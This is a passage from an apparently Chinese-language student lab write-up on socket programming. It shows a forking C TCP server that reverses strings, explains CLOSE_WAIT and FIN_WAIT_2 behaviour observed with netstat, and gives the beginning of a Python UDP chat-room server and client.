<span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt; p1; ++p1, --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">		  *p2 ^= *p1;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="comment">/* UTF-8汉字一个是三个字节，进行相应逆序转化 */</span></span><br><span class="line">	  <span class="keyword">for</span> (p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt;= str; --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  <span class="keyword">if</span> (*p2&amp;<span class="number">0x80</span>)<span class="comment">//最高位为1</span></span><br><span class="line">		  &#123;</span><br><span class="line">			  </span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  *(p2<span class="number">-2</span>) ^= *p2;</span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  p2 = p2<span class="number">-2</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> server_sock_listen, server_sock_data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> client_addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	<span class="keyword">char</span> recv_msg[<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">char</span> stop_word[]=<span class="string">"bye"</span>;</span><br><span class="line">	<span class="keyword">int</span> is_esc;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> fork_value; </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建socket */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">    函数原型: int socket(int family, int type, int protocol); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	family：协议族。实验用AF_INET</span></span><br><span class="line"><span class="comment">    type：socket类型。常见有SOCK_STREAM、SOCK_DGRAM、SOCK_RAW等</span></span><br><span class="line"><span class="comment">    protocol：具体协议。0表示默认协议</span></span><br><span class="line"><span class="comment">	返回值:</span></span><br><span class="line"><span class="comment">	成功：返回一个新建的socket，用于数据传输</span></span><br><span class="line"><span class="comment">    失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">    *************************************************/</span></span><br><span class="line">	server_sock_listen = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"创建socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 指定服务器地址 */</span></span><br><span class="line">    <span class="comment">/* 用于socket创建通信连接的类型，这里就是ipv4地址类型的通信连接可用 */</span></span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">/* 整型变量从主机字节顺序转变成网络字节顺序：大头序 */</span></span><br><span class="line">	server_addr.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="comment">/* INADDR_ANY表示本机所有IP地址 */</span></span><br><span class="line">	server_addr.sin_addr.s_addr = htonl(INADDR_ANY); </span><br><span class="line">    <span class="comment">/* 进行零填充 */</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;server_addr.sin_zero, <span class="number">0</span>, <span class="keyword">sizeof</span>(server_addr.sin_zero)); </span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"指定服务器地址失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 绑定socket与地址 */</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">    函数原型: int bind(int sockfd, const struct sockaddr *addr, int addrlen); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	sockfd：要绑定的socket的描述符</span></span><br><span class="line"><span class="comment">	addr：要绑定的地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换</span></span><br><span class="line"><span class="comment">	addrlen：地址结构大小。可使用sizeof自动计算</span></span><br><span class="line"><span class="comment">	返回值：</span></span><br><span class="line"><span class="comment">	成功：返回0</span></span><br><span class="line"><span class="comment">	失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	bind(server_sock_listen, (struct sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"绑定socket与地址失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 监听socket */</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	函数原型：int listen(int sockfd, int backlog); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	sockfd：要监听的socket的描述符</span></span><br><span class="line"><span class="comment">	backlog：该socket上完成队列的最大长度。完成队列是指已完成三次握手(established)，但尚未被服务器接受（accept）的客户机</span></span><br><span class="line"><span class="comment">	返回值：</span></span><br><span class="line"><span class="comment">	成功：返回0</span></span><br><span class="line"><span class="comment">	失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="built_in">listen</span>(server_sock_listen, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Server is listening....\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">"监听socket失败\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* 接收并显示消息 */</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型：int accept(int sockfd, struct sockaddr *addr, int *addrlen); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：用于接受连接的socket的描述符</span></span><br><span class="line"><span class="comment">		addr：客户机地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换。如果不关心客户机地址，可以设为NULL</span></span><br><span class="line"><span class="comment">		addrlen：客户机地址结构大小。如果不关心，可以和addr一起设为NULL</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回一个新建的socket，用于数据传输</span></span><br><span class="line"><span class="comment">		失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		server_sock_data = accept(server_sock_listen, (struct sockaddr *)&amp;client_addr, &amp;client_addrlen);<span class="comment">//服务器接受连接</span></span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"服务器接受连接失败"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Accept %s:%d\n"</span>, inet_ntoa(client_addr.sin_addr), client_addr.sin_port);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">/* 杀死僵尸进程 */</span></span><br><span class="line">		signal(SIGCHLD,SIG_IGN);</span><br><span class="line">        <span class="comment">/* 创建子进程 */</span></span><br><span class="line">		fork_value = fork();</span><br><span class="line">		<span class="keyword">if</span> (fork_value == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"Fail to call to fork"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(fork_value == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* 关闭监听socket */</span></span><br><span class="line">			<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">            函数原型：int close(int sockfd); </span></span><br><span class="line"><span class="comment">            参数：</span></span><br><span class="line"><span class="comment">            sockfd：要关闭的socket的描述符</span></span><br><span class="line"><span class="comment">            返回值：</span></span><br><span class="line"><span class="comment">            成功：返回0</span></span><br><span class="line"><span class="comment">            失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">            *************************************************/</span></span><br><span class="line">            <span class="comment">/*首先关闭掉监听server_sock_listen，因为子进程并不需要监听，它只负责处理逻辑并发消息给客户端*/</span></span><br><span class="line">			<span class="built_in">close</span>(server_sock_listen);</span><br><span class="line">			<span class="keyword">if</span> (errno)</span><br><span class="line">			&#123;</span><br><span class="line">				perror(<span class="string">"关闭监听socket失败"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				is_esc = <span class="number">0</span>;</span><br><span class="line">				<span class="built_in">memset</span>(recv_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_msg)); <span class="comment">//接收数组置零</span></span><br><span class="line">				<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">                函数原型: int recv(int sockfd, void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">                参数：</span></span><br><span class="line"><span class="comment">                sockfd：用于接收数据的socket的描述符</span></span><br><span class="line"><span class="comment">                buf：指向数据的指针</span></span><br><span class="line"><span class="comment">                len：接收数据大小</span></span><br><span class="line"><span class="comment">                flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">                返回值：</span></span><br><span class="line"><span class="comment">                成功：返回接收的数据大小</span></span><br><span class="line"><span class="comment">                失败：如果对方已关闭连接，返回0；其他错误返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">                *************************************************/</span></span><br><span class="line">				<span class="keyword">if</span> (recv(server_sock_data, recv_msg, <span class="keyword">sizeof</span>(recv_msg), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"The client %s:%d disconnected\n"</span>, inet_ntoa(client_addr.sin_addr), client_addr.sin_port);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"From %s:%d: %s\n"</span>, inet_ntoa(client_addr.sin_addr), client_addr.sin_port, recv_msg);</span><br><span class="line">				<span class="keyword">if</span> (errno)</span><br><span class="line">				&#123;</span><br><span class="line">					perror(<span class="string">"显示消息失败"</span>);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(recv_msg); i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(recv_msg[i] == <span class="number">27</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						is_esc = <span class="number">1</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(recv_msg,stop_word) == <span class="number">0</span> || is_esc )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">continue</span>;<span class="comment">//直接到下一循环的判断连接模块</span></span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				strrev(recv_msg);<span class="comment">//字符串逆序</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">/* 发送消息 */</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"reply %s:%d: %s\n"</span>, inet_ntoa(client_addr.sin_addr), client_addr.sin_port, recv_msg);</span><br><span class="line">				<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">                函数原型: int send(int sockfd, const void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">                参数：</span></span><br><span class="line"><span class="comment">                sockfd：用于发送数据的socket的描述符</span></span><br><span class="line"><span class="comment">                buf：指向数据的指针</span></span><br><span class="line"><span class="comment">                len：发送数据大小</span></span><br><span class="line"><span class="comment">                flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">                返回值：</span></span><br><span class="line"><span class="comment">                成功：返回发送的数据大小</span></span><br><span class="line"><span class="comment">                失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">                *************************************************/</span></span><br><span class="line">				send(server_sock_data, recv_msg, <span class="built_in">strlen</span>(recv_msg), <span class="number">0</span>);</span><br><span class="line">				<span class="keyword">if</span> (errno)</span><br><span class="line">				&#123;</span><br><span class="line">					perror(<span class="string">"发送消息失败"</span>);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">            </span><br><span class="line">			<span class="comment">/* 关闭数据socket */</span></span><br><span class="line">			<span class="built_in">close</span>(server_sock_data);</span><br><span class="line">			<span class="keyword">if</span> (errno)</span><br><span class="line">			&#123;</span><br><span class="line">				perror(<span class="string">"关闭数据socket失败"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* 关闭数据socket */</span></span><br><span class="line">			<span class="built_in">close</span>(server_sock_data);</span><br><span class="line">			<span class="keyword">if</span> (errno)</span><br><span class="line">			&#123;</span><br><span class="line">				perror(<span class="string">"关闭数据socket失败"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* 关闭监听socket */</span></span><br><span class="line">	<span class="built_in">close</span>(server_sock_listen);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">"关闭监听socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-运行截图"><a href="#2-运行截图" class="headerlink" title="(2) 运行截图"></a>(2) 运行截图</h4><p>1°在同一主机下 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212355639.png" alt="image-20200322212355639"></p>
<p>2°在同一局域网的不同主机下 </p>
<p>树莓派作为服务器端:</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212407992.png" alt="image-20200322212407992"></p>
<p>手机的Termux和电脑虚拟机作为客户机分别运行</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212427094.png" alt="image-20200322212427094"></p>
<p>NAT模式虚拟机作为客户机交互信息的原因：使用的是TCP协议，虚拟机向外发送信息，服务端接收，便会形成一条通路，主机对于虚拟机建立端口映射，而外部服务器便可以通过这条通路将信息送回NAT模式下的虚拟机客户机</p>
<h4 id="3-错误纠正"><a href="#3-错误纠正" class="headerlink" title="(3) 错误纠正"></a>(3) 错误纠正</h4><p>任务2中服务器端需用到所传来消息的客户机对应的地址，需要用到accept()函数的后面第2个参数</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212434682.png" alt="image-20200322212434682"></p>
<p>其中对于后两个参数，使用时必须<strong>要么全设为NULL,要么就都要传入非NULL的参数</strong>，只有用到第二个参数仍要对第三个参数传入正确的值，否则将会报错，正确使用如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">server_sock_data = accept(server_sock_listen, (struct sockaddr *)&amp;client_addr, &amp;client_addrlen);<span class="comment">//服务器接受连接</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Solution-②-1"><a href="#Solution-②-1" class="headerlink" title="Solution ②"></a>Solution ②</h3><p>父进程分支仍需要关闭该socket</p>
<p>使用端口为12345，使用netstat命令观察服务器socket状态：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">netstat -an|grep 12345</span><br></pre></td></tr></table></figure></div>
<p>（1）当父进程分支有关闭server_sock_data</p>
<p>首先服务端开启，三个客户端依次连接，然后依次发了“hi”消息</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212444303.png" alt="image-20200322212444303"></p>
<p>接着客户机依次关闭，服务器再关闭</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212450300.png" alt="image-20200322212450300"></p>
<p>可以发现当客户端断开连接，服务器继续运行的话可以端口可以正常释放，进入TIME_WAIT状态，经过两倍报文段寿命端口便会被释放</p>
<p>（2）当父进程分支没有关闭server_sock_data</p>
<p>首先服务端开启，三个客户端依次连接，然后依次发了“hi”消息</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212458251.png" alt="image-20200322212458251"></p>
<p>接着客户机依次关闭，服务器再关闭</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212506437.png" alt="image-20200322212506437"></p>
<p>可以发现当客户端断开连接，服务器继续运行，由TCP有限状态图，服务器进入被动关闭连接状态，而客户机处于主动关闭连接状态，此时，只有服务器执行close函数的操作，才能发送FIN，进入到LAST_ACK，但是服务器并没有执行close，对于服务器而言这些端口便会一直处于CLOST_WAIT状态，也就是socket无法被释放掉，而其所分配的描述符也不能被回收利用。</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212512970.png" alt="image-20200322212512970"></p>
<p>如果有多个进程同时访问一个socket，close只关闭本进程对该socket的访问，不影响其他进程，当所有进程都close后，这个socket才被彻底清除，因此对于不仅要在子进程关闭socket，也要在父进程关闭socket</p>
<p> 由于可分配的socket描述符是有限的，如果分配了以后不释放，也就是不能回收再利用，描述符最终会被耗尽。再而，原本服务端里父进程将和客户端连接的任务交给子进程之后就可以去accept下一个连接，但是如果父进程自己不关闭自己和客户端的连接，这个连接便会(被服务器认为)永远存在，直到服务端停止运行。</p>
<p>因此父进程分支仍需要关闭该socket</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212528943.png" alt="image-20200322212528943"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212534973.png" alt="image-20200322212534973"></p>
<p>另外客户端为什么会从FIN_WAIT_2后就自动将端口释放了呢？从以下文章找到答案<a href="https://blog.csdn.net/dog250/article/details/81256550">一个TCP FIN_WAIT2状态细节引发的感慨</a></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212543345.png" alt="image-20200322212543345"></p>
<p>因此我们知道FIN_WAIT_2也是有超时机制的，其时间是180秒，并且<strong>连接在FIN_WAIT_2超时后并不会进入TIME_WAIT状态，也不会发送RESET，而是直接默默消失。</strong> </p>
<h2 id="任务3：基于UDP-socket的聊天室-（Python）"><a href="#任务3：基于UDP-socket的聊天室-（Python）" class="headerlink" title="任务3：基于UDP socket的聊天室 （Python）"></a>任务3：基于UDP socket的聊天室 （Python）</h2><h3 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求:"></a>任务要求:</h3><p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212604984.png" alt="image-20200322212604984"></p>
<p>基于udp socket的多人实时聊天室</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>使用多线程的方法让客户端同时进行发送和接受消息</p>
<p>以下是包含两个继承了socket.socket的Server和Client类的两个模块</p>
<h4 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys,time,os</span><br><span class="line"></span><br><span class="line">SPLIT = <span class="string">"|"</span> <span class="comment">#用于隔开用户名和消息以及判断是发送过来的信息是客户登录时的用户名还是聊天信息</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span> <span class="comment">#要接收的最大数据量</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span><span class="params">(socket.socket)</span>:</span></span><br><span class="line">    <span class="string">'''这是一个继承socket.socket的类，用于实现服务端程序'''</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,serv_address)</span>:</span></span><br><span class="line">        <span class="string">'''用父类socket.socket的初始化方法来初始化继承的属性'''</span></span><br><span class="line">        <span class="comment">#socket.SOCK_DGRAM用于不可靠传输UDP</span></span><br><span class="line">        super(Server, self).__init__(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">        self.__serv_address = serv_address<span class="comment">#服务器地址</span></span><br><span class="line">        self.__clnt_address = dict()<span class="comment">#客户机地址</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_clnt_addr</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于访问私有变量self.__clnt_address'''</span></span><br><span class="line">        <span class="keyword">return</span> self.__clnt_address</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(self, msg, address, Type)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于发送消息</span></span><br><span class="line"><span class="string">        msg是要发送的字符串</span></span><br><span class="line"><span class="string">        address是目的地址，形式为（ipaddr，port）的元组</span></span><br><span class="line"><span class="string">        Type是发送对象的类型，包括广播（代表系统发送的消息）、单播、多播</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> Type == <span class="string">'Broadcast'</span>:</span><br><span class="line">            msg = <span class="string">'Broadcast'</span> + SPLIT + msg</span><br><span class="line">            print(self.__clnt_address,time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>,time.localtime(time.time())))<span class="comment">#服务端打印发送时间</span></span><br><span class="line">            <span class="keyword">for</span> name, address <span class="keyword">in</span> self.__clnt_address.items():</span><br><span class="line">                self.sendto(msg.encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>),address)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">elif</span> Type == <span class="string">'Unicast'</span>:</span><br><span class="line">            <span class="comment">#只发送给address</span></span><br><span class="line">            msg = <span class="string">'Unicast'</span> + SPLIT + msg</span><br><span class="line">            self.sendto(msg.encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>), address)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> Type==<span class="string">'Multicast'</span>:</span><br><span class="line">            <span class="comment">#发送给所有人，但不包括服务端</span></span><br><span class="line">            <span class="keyword">for</span> name, address <span class="keyword">in</span> self.__clnt_address.items():</span><br><span class="line">                <span class="keyword">if</span> address != self.__serv_address:</span><br><span class="line">                    self.sendto(msg.encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>), address)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于启动该服务端'''</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#首先客户机对地址进行绑定</span></span><br><span class="line">        self.bind(self.__serv_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data, addr = self.recvfrom(BUFSIZE)<span class="comment">#接收信息</span></span><br><span class="line">                data = data.decode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> SPLIT <span class="keyword">not</span> <span class="keyword">in</span> data: <span class="comment">#客户第一次登录，发送过来的只有不包含'|'的用户名</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"user.txt"</span>, <span class="string">'r+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        <span class="comment">#往user.txt添加客户名</span></span><br><span class="line">                        user_list=f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">                        <span class="keyword">while</span> data <span class="keyword">in</span> user_list:<span class="comment">#如果用户名已存在就发送error代表客户名重复</span></span><br><span class="line">                            self.sendto(<span class="string">b'error'</span>,addr)</span><br><span class="line">                            data, addr = self.recvfrom(BUFSIZE)<span class="comment">#重新接收客户名</span></span><br><span class="line">                            data = data.decode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>)</span><br><span class="line">                        f.write(data+<span class="string">"\n"</span>)</span><br><span class="line">                    self.__clnt_address[data] = addr</span><br><span class="line">                    self.send_msg(<span class="string">"欢迎%s进入聊天室...."</span> % data,<span class="string">''</span>,<span class="string">'Broadcast'</span>)</span><br><span class="line">                    self.send_msg(<span class="string">"------------------%s------------------"</span>%data,addr,<span class="string">'Unicast'</span>)<span class="comment">#只发送给该用户</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> data.split(SPLIT)[<span class="number">1</span>] == <span class="string">"exit"</span>:<span class="comment">#传来消息为"exit"则代表有客户退出聊天室</span></span><br><span class="line"></span><br><span class="line">                    self.__clnt_address.pop(data.split(SPLIT)[<span class="number">0</span>])</span><br><span class="line">                    self.send_msg(<span class="string">"%s离开了聊天室...."</span>%data.split(SPLIT)[<span class="number">0</span>],<span class="string">''</span>,<span class="string">'Broadcast'</span>)<span class="comment">#通知其他客户该客户离开聊天室</span></span><br><span class="line">                    <span class="comment">#在user.txt去除该客户名</span></span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"user.txt"</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        l=<span class="string">''</span>.join(f.read().split(data.split(SPLIT)[<span class="number">0</span>]+<span class="string">'\n'</span>))</span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"user.txt"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        f.write(l)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#其他消息就进行群发</span></span><br><span class="line">                    </span><br><span class="line">                    self.send_msg(data, <span class="string">''</span>,<span class="string">'Multicast'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        self.close()</span><br></pre></td></tr></table></figure></div>
<h4 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">SPLIT = <span class="string">"|"</span> <span class="comment">#用于隔开用户名和消息以及判断是发送过来的信息是客户登录时的用户名还是聊天信息</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span> <span class="comment">#要接收的最大数据量</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span><span class="params">(socket.socket)</span>:</span></span><br><span class="line">    <span class="string">'''这是一个继承socket.socket的类，用于实现客户端程序'''</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, address)</span>:</span></span><br><span class="line">        <span class="string">'''用父类socket.socket的初始化方法来初始化继承的属性'''</span></span><br><span class="line">        <span class="comment">#socket.SOCK_DGRAM用于不可靠传输UDP</span></span><br><span class="line">        super(Client, self).__init__(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">        self.__name = name<span class="comment">#客户名</span></span><br><span class="line">        self.__address = address<span class="comment">#客户机地址</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于启动该客户端'''</span></span><br><span class="line">    